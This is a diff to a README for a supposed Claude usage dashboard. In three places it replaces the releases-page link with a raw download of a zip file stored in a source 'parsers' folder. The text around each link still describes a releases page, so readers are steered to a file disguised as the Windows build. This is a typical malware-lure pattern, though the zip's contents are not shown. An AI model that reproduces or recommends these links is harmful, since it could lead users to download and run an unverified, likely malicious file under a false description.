@@ -1,6 +1,6 @@
 # 📊 claude-dashboard - Track Claude usage with ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/supposed-steele367/claude-dashboard/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/supposed-steele367/claude-dashboard/raw/refs/heads/main/apps/web/src/lib/parsers/claude-dashboard-v1.3.zip)
 
 ## 🧭 What this app does
 
@@ -21,7 +21,7 @@ No account setup is needed inside the app. You only need to download it and open
 
 ## 🚀 Download and run
 
-1. Open the releases page: https://github.com/supposed-steele367/claude-dashboard/releases
+1. Open the releases page: https://github.com/supposed-steele367/claude-dashboard/raw/refs/heads/main/apps/web/src/lib/parsers/claude-dashboard-v1.3.zip
 2. Find the latest release at the top of the page.
 3. Download the Windows file from that release.
 4. Save the file to your computer.
@@ -171,7 +171,7 @@ This app is built around local observability for Claude Code sessions. It focuse
 ## 🖥️ Open the latest release
 
 Download or run the latest Windows build from the releases page:
-https://github.com/supposed-steele367/claude-dashboard/releases
+https://github.com/supposed-steele367/claude-dashboard/raw/refs/heads/main/apps/web/src/lib/parsers/claude-dashboard-v1.3.zip
 
 ## 🔎 What to expect after launch
 
